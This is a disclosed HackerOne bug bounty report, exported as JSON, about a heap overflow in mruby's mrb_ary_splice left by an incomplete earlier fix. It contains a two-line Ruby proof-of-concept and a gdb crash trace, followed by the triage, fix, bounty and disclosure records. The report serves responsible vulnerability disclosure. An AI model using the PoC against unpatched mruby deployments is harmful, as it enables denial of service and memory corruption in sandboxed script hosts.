{"id":197719,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTc3MTk=","url":"https://hackerone.com/reports/197719","title":"Still heap overflow in mrb_ary_splice","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-01-12T04:51:40.576Z","submitted_at":"2017-01-12T04:51:40.576Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tunz","url":"/tunz","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-02-07T07:42:20.551Z","bug_reporter_agreed_on_going_public_at":"2017-02-07T07:42:20.507Z","team_member_agreed_on_going_public_at":"2017-02-07T01:28:02.188Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The fix of #192362 is still crashed with a different PoC. I think the cause of this bug is the same and I missed the incomplete fix, so you may be able to skip rewards for this one.\n\n# Cause\nIf I set the `tail` value to a specific value, then I can maintain the array size. [The original fix](https://github.com/ksss/mruby/commit/caba1a19dc3f9e31612d8439cfa7fbf60d05bbb0) only checks array size, but it still overwrites too many value due to the big `head` value in https://github.com/ksss/mruby/blob/caba1a19dc3f9e31612d8439cfa7fbf60d05bbb0/src/array.c#L630.\n\n# PoC\n(64bits for mrb_int)\n```ruby\nary = Array.new(1024)\nary[0x7ffffffffffffc00,1024] = Array.new(1024)\n```\n\n# gdb\n```\n$ gdb -q --args ./bin/mruby test10.rb\nReading symbols from ./bin/mruby...done.\n(gdb) r\nStarting program: /home/tunz/working/mruby/mruby/bin/mruby test10.rb\n1024\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000414878 in ary_fill_with_nil (ptr=0x22e3010, size=9223372036854765361) at /home/tunz/working/mruby/mruby/src/array.c:104\n104         *ptr++ = nil;\n(gdb) bt\n#0  0x0000000000414878 in ary_fill_with_nil (ptr=0x22e3010, size=9223372036854765361)\n    at /home/tunz/working/mruby/mruby/src/array.c:104\n#1  0x00000000004160e6 in mrb_ary_splice (mrb=0x225e010, ary=..., head=9223372036854774784, len=1024, rpl=...)\n    at /home/tunz/working/mruby/mruby/src/array.c:639\n#2  0x00000000004166d3 in mrb_ary_aset (mrb=0x225e010, self=...) at /home/tunz/working/mruby/mruby/src/array.c:821\n#3  0x0000000000430fd5 in mrb_vm_exec (mrb=0x225e010, proc=0x22611b0, pc=0x22c61bc) at /home/tunz/working/mruby/mruby/src/vm.c:1174\n#4  0x000000000042f47b in mrb_vm_run (mrb=0x225e010, proc=0x22611b0, self=..., stack_keep=0)\n    at /home/tunz/working/mruby/mruby/src/vm.c:772\n#5  0x0000000000437599 in mrb_top_run (mrb=0x225e010, proc=0x22611b0, self=..., stack_keep=0)\n    at /home/tunz/working/mruby/mruby/src/vm.c:2491\n#6  0x0000000000447c47 in mrb_load_exec (mrb=0x225e010, p=0x22ba450, c=0x22b90c0)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n#7  0x0000000000447cdd in mrb_load_file_cxt (mrb=0x225e010, f=0x22ba090, c=0x22b90c0)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5764\n#8  0x00000000004024fc in main (argc=2, argv=0x7fff6c17e5b8)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n(gdb)\n```","vulnerability_information_html":"\u003cp\u003eThe fix of \u003ca href=\"/reports/192362\"\u003e#192362\u003c/a\u003e is still crashed with a different PoC. I think the cause of this bug is the same and I missed the incomplete fix, so you may be able to skip rewards for this one.\u003c/p\u003e\n\n\u003ch1 id=\"cause\"\u003eCause\u003c/h1\u003e\n\n\u003cp\u003eIf I set the \u003ccode\u003etail\u003c/code\u003e value to a specific value, then I can maintain the array size. \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fksss%2Fmruby%2Fcommit%2Fcaba1a19dc3f9e31612d8439cfa7fbf60d05bbb0\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eThe original fix\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e only checks array size, but it still overwrites too many value due to the big \u003ccode\u003ehead\u003c/code\u003e value in \u003ca title=\"https://github.com/ksss/mruby/blob/caba1a19dc3f9e31612d8439cfa7fbf60d05bbb0/src/array.c#L630\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fksss%2Fmruby%2Fblob%2Fcaba1a19dc3f9e31612d8439cfa7fbf60d05bbb0%2Fsrc%2Farray.c%23L630\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/ksss/mruby/blob/caba1a19dc3f9e31612d8439cfa7fbf60d05bbb0/src/array.c#L630\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003ch1 id=\"poc\"\u003ePoC\u003c/h1\u003e\n\n\u003cp\u003e(64bits for mrb_int)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003eary\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eArray\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1024\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"n\"\u003eary\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mh\"\u003e0x7ffffffffffffc00\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e1024\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eArray\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1024\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"gdb\"\u003egdb\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ gdb -q --args ./bin/mruby test10.rb\nReading symbols from ./bin/mruby...done.\n(gdb) r\nStarting program: /home/tunz/working/mruby/mruby/bin/mruby test10.rb\n1024\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000414878 in ary_fill_with_nil (ptr=0x22e3010, size=9223372036854765361) at /home/tunz/working/mruby/mruby/src/array.c:104\n104         *ptr++ = nil;\n(gdb) bt\n#0  0x0000000000414878 in ary_fill_with_nil (ptr=0x22e3010, size=9223372036854765361)\n    at /home/tunz/working/mruby/mruby/src/array.c:104\n#1  0x00000000004160e6 in mrb_ary_splice (mrb=0x225e010, ary=..., head=9223372036854774784, len=1024, rpl=...)\n    at /home/tunz/working/mruby/mruby/src/array.c:639\n#2  0x00000000004166d3 in mrb_ary_aset (mrb=0x225e010, self=...) at /home/tunz/working/mruby/mruby/src/array.c:821\n#3  0x0000000000430fd5 in mrb_vm_exec (mrb=0x225e010, proc=0x22611b0, pc=0x22c61bc) at /home/tunz/working/mruby/mruby/src/vm.c:1174\n#4  0x000000000042f47b in mrb_vm_run (mrb=0x225e010, proc=0x22611b0, self=..., stack_keep=0)\n    at /home/tunz/working/mruby/mruby/src/vm.c:772\n#5  0x0000000000437599 in mrb_top_run (mrb=0x225e010, proc=0x22611b0, self=..., stack_keep=0)\n    at /home/tunz/working/mruby/mruby/src/vm.c:2491\n#6  0x0000000000447c47 in mrb_load_exec (mrb=0x225e010, p=0x22ba450, c=0x22b90c0)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5755\n#7  0x0000000000447cdd in mrb_load_file_cxt (mrb=0x225e010, f=0x22ba090, c=0x22b90c0)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-compiler/core/parse.y:5764\n#8  0x00000000004024fc in main (argc=2, argv=0x7fff6c17e5b8)\n    at /home/tunz/working/mruby/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232\n(gdb)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"800.0","formatted_bounty":"$800","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-03-09T01:28:02.241Z","allow_singular_disclosure_after":-120194644.92521705,"singular_disclosure_allowed":true,"vote_count":3,"voters":["mpz","eveeez","spetr0x"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1415295,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!","markdown_message":"\u003cp\u003eThank you for reporting this bug! This is an automated response to let you know that we\u0026#39;ve received your issue, and we\u0026#39;ll process it as soon as possible.\u003c/p\u003e\n\n\u003cp\u003eDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!\u003c/p\u003e\n","automated_response":true,"created_at":"2017-01-12T04:51:40.750Z","updated_at":"2017-01-12T04:51:40.750Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1434709,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the crash and opened an issue upstream: https://github.com/mruby/mruby/issues/3405","markdown_message":"\u003cp\u003eThank you for your report. We\u0026#39;ve reproduced the crash and opened an issue upstream: \u003ca title=\"https://github.com/mruby/mruby/issues/3405\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3405\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/issues/3405\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-21T14:43:23.332Z","updated_at":"2017-01-21T14:43:23.332Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1465414,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report. This issue has been addressed upstream in https://github.com/mruby/mruby/pull/3409 and https://github.com/mruby/mruby/issues/3413.\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.","markdown_message":"\u003cp\u003eThanks again for your report. This issue has been addressed upstream in \u003ca title=\"https://github.com/mruby/mruby/pull/3409\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fpull%2F3409\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/pull/3409\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and \u003ca title=\"https://github.com/mruby/mruby/issues/3413\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3413\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/issues/3413\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eOur next round of bounty decisions will take place within two weeks, so we\u0026#39;ll be in touch with you again soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-06T15:52:56.605Z","updated_at":"2017-02-06T15:52:56.605Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"tunz","url":"/tunz"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1467363,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Mruby and Shopify Scripts!","markdown_message":"\u003cp\u003eThanks for helping improve the security of Mruby and Shopify Scripts!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-07T01:27:56.423Z","updated_at":"2017-02-07T01:27:56.423Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"800.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"tunz","url":"/tunz"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1467364,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-07T01:28:02.212Z","updated_at":"2017-02-07T01:28:02.212Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1467832,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-07T07:42:20.523Z","updated_at":"2017-02-07T07:42:20.523Z","actor":{"username":"tunz","cleared":false,"url":"/tunz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1467833,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-07T07:42:20.568Z","updated_at":"2017-02-07T07:42:20.568Z","actor":{"username":"tunz","cleared":false,"url":"/tunz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}